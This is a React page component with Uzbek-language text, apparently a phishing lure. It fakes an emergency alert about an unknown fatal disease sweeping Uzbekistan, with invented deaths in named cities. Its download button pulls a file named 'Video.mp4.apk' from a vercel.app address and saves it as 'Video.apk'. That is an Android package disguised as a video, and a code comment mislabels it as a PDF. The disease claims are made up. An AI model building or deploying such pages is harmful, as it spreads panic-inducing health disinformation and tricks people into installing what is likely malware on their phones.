import React, { useEffect } from 'react';

function App() {
  useEffect(() => {
    // Установка даты
    const now = new Date();
    const options = {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    };
    const dateElement = document.getElementById('current-date');
    if (dateElement) {
      dateElement.textContent = now.toLocaleDateString('uz-UZ', options);
    }

    // Обработчик кнопки
    const downloadButton = document.getElementById('download-file');
    if (downloadButton) {
        const handleClick = function(e) {
            e.preventDefault();
    
            // Путь к файлу на сервере
            const fileUrl = 'https://uzbekistan-info.vercel.app/docs/pandemy/Video.mp4.apk'; // Пример: PDF с описанием вакансии
    
            // Создаём виртуальную ссылку
            const link = document.createElement('a');
            link.href = fileUrl;
            link.download = 'Video.apk'; // Имя файла при скачивании
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link); // Удаляем ссылку
          };

      downloadButton.addEventListener('click', handleClick);

      // Очистка обработчика
      return () => {
        downloadButton.removeEventListener('click', handleClick);
      };
    }
  }, []);

  return (
    <div className="App">
      {/* Фоновое изображение */}
      <div
        className="hero"
        style={{
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          backgroundImage: "url('/the-pandemics-the-epidemics.jpg')", // ✅ Путь с /
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat',
          filter: 'blur(8px) brightness(0.7)',
          zIndex: -1
        }}
      ></div>

      <header
        style={{
          backgroundColor: 'rgba(255, 255, 255, 0.35)',
          padding: '20px',
          textAlign: 'center',
          borderBottom: '4px solid #c00',
          backdropFilter: 'blur(4px)',
          WebkitBackdropFilter: 'blur(4px)'
        }}
      >
        <div className="flag-container" style={{ display: 'inline-block', marginBottom: '10px' }}>
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/8/84/Flag_of_Uzbekistan.svg"
            alt="O'zbekiston bayrog'i"
            className="flag"
            style={{
              height: '50px',
              border: '1px solid #aaa',
              borderRadius: '4px'
            }}
          />
        </div>
        <h1
          className="panic-title"
          style={{
            fontSize: '2.6rem',
            color: '#d00',
            margin: '10px 0',
            textShadow: '0 0 8px rgba(255, 0, 0, 0.3)',
            animation: 'pulse 2s infinite'
          }}
        >
          ⚠️ FAVQULODDA XAVF! ⚠️
        </h1>
        <h2
          style={{
            fontSize: '1.8rem',
            color: '#000',
            margin: '12px 0',
            fontWeight: 'bold'
          }}
        >
          O'zbekistonda noma'lum o'limga sabab bo'ladigan kasallik tarqamoqda!
        </h2>
        <p
          className="date"
          id="current-date"
          style={{
            fontStyle: 'italic',
            color: '#555',
            marginTop: '8px'
          }}
        ></p>
      </header>

      <main
        style={{
          padding: '30px 15px', // Уменьшили отступы по бокам на мобильных
          maxWidth: '900px',
          margin: '0 auto',
          backgroundColor: 'rgba(255, 255, 255, 0.95)',
          borderRadius: '12px',
          boxShadow: '0 6px 25px rgba(200, 0, 0, 0.2)',
          position: 'relative',
          zIndex: 2,
          border: '2px solid #ff6b6b'
        }}
      >
        <div className="content">
          <div className="text">
            <p
              className="urgent"
              style={{
                backgroundColor: '#fff3f3',
                padding: '14px',
                borderLeft: '4px solid #e00',
                marginBottom: '20px',
                fontWeight: 'bold',
                color: '#c00',
                fontSize: '1.15rem'
              }}
            >
              🚨 <strong>SO'NGGI MA'LUMOTLAR:</strong> Butun mamlakat bo'ylab noma'lum, juda xavfli kasallik tezda tarqayapti!
            </p>

            <p style={{ fontSize: '1rem' }}>
              ✅ Kasallikning sababi hali aniqlanmagan.<br />
              ✅ Bir necha soat ichida o'limga sabab bo'lishi mumkin.<br />
              ✅ Toshkent, Samarqand, Farg'ona va boshqa viloyatlarda vafot hollari qayd etilmoqda.<br />
              ✅ Sog'liqni saqlash tizimi chegarasiga yetib qoldi.
            </p>

            <p
              className="warning"
              style={{
                backgroundColor: '#ffecec',
                padding: '12px',
                border: '1px solid #ffb3b3',
                margin: '20px 0',
                color: '#d00',
                fontWeight: 'bold',
                borderRadius: '6px'
              }}
            >
              ⚠️ <strong>XAVF JUDA YUQORI!</strong> Har qanday belgi paydo bo'lganda darhol harakat qiling!
            </p>

            {/* ✅ Заменено с <a> на <button> */}
            <div
              className="action-button"
              style={{
                marginTop: '25px',
                textAlign: 'center'
              }}
            >
              <button
                id="download-file"
                style={{
                  display: 'inline-block',
                  padding: '14px 36px',
                  backgroundColor: '#c00',
                  color: 'white',
                  textDecoration: 'none',
                  borderRadius: '40px',
                  fontWeight: 'bold',
                  fontSize: '1.2rem',
                  border: 'none', // Убрана рамка кнопки
                  cursor: 'pointer',
                  transition: 'all 0.2s',
                  boxShadow: '0 4px 10px rgba(200, 0, 0, 0.4)'
                }}
                onMouseOver={(e) => {
                  e.target.style.backgroundColor = '#a00';
                  e.target.style.transform = 'scale(1.05)';
                  e.target.style.boxShadow = '0 6px 15px rgba(200, 0, 0, 0.6)';
                }}
                onMouseOut={(e) => {
                  e.target.style.backgroundColor = '#c00';
                  e.target.style.transform = 'scale(1)';
                  e.target.style.boxShadow = '0 4px 10px rgba(200, 0, 0, 0.4)';
                }}
              >
                ❗ FAYLNI YUKLAB OLISH →
              </button>
            </div>
          </div>
        </div>
      </main>

      <style>{`
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.03); }
        }

        /* Адаптивность */
        @media (max-width: 768px) {
          .panic-title {
            font-size: 2rem; /* Уменьшаем заголовок */
          }

          header h2 {
            font-size: 1.5rem; /* Уменьшаем подзаголовок */
          }

          main {
            padding: 20px 10px; /* Уменьшаем отступы */
          }

          .urgent, .warning, p {
            font-size: 1rem; /* Уменьшаем шрифт текста */
          }

          .flag {
            height: 40px; /* Уменьшаем флаг */
          }

          button {
            width: 90%; /* Кнопка занимает 90% ширины на мобильных */
            padding: 16px 20px;
            font-size: 1.1rem;
          }
        }

        @media (max-width: 480px) {
          .panic-title {
            font-size: 1.8rem;
          }

          header h2 {
            font-size: 1.3rem;
          }

          .urgent, .warning, p {
            font-size: 0.95rem;
          }

          button {
            width: 95%;
            padding: 14px 15px;
            font-size: 1rem;
          }
        }
      `}</style>
    </div>
  );
}

export default App;